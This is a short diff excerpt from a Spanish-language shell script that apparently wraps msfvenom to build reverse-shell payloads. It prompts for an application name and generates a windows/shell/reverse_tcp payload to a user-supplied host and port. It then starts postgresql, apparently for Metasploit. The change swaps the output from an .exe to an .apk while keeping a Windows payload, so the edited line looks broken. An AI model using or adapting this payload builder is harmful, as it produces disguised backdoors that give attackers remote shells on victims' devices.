@@ -93,7 +93,7 @@ sleep 2s
 echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
 read NOMBRE
 sleep 2s
-msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PUERTO -f apk -o $NOMBRE.apk
 sleep 2s
 sudo service postgresql start
 sleep 2s
